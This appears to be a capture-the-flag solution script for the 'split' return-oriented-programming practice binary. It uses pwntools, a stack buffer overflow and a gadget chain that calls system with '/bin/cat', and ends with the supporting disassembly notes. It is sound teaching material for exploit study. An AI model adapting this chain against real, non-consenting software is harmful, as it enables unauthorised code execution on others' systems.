#!/usr/bin/env python3

from pwn import *

exe = './split'
elf = context.binary = ELF(exe,checksec=False)
context.log_level='debug'

p = process(exe)

padding = 40
pop_rdi = 0x00000000004007c3 # ropper --file split --search "pop rdi"
system = 0x000000000040074b

#bin_cat = 0x601060  # in pwndbg : search "/bin/cat"
ret = 0x000000000040053e #  ropper --file split --search "ret"

bin_cat = next(elf.search(b'/bin/cat'))

payload = flat(
    asm('nop')*padding,#padding to reach EIP
    pop_rdi,
    bin_cat,
    #elf.symbols['system'],
    system,
)

p.sendlineafter(b'>',payload)
p.interactive()

'''
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

   0x000000000040071f <+55>:	lea    rax,[rbp-0x20]
   0x0000000000400723 <+59>:	mov    edx,0x60
   0x0000000000400728 <+64>:	mov    rsi,rax
   0x000000000040072b <+67>:	mov    edi,0x0
   0x0000000000400730 <+72>:	call   0x400590 <read@plt>

reading 0x60(96) bytes into a buffer of size 0x20(32) bytes
We have a function named usefulFunction() which makes call to system with command /bin/ls

0x000000000040074b <+9>:	call   0x400560 <system@plt>
Since the binary dosent have PIE enabeled we can simply use the address of system and pass /bin/cat to it

'''
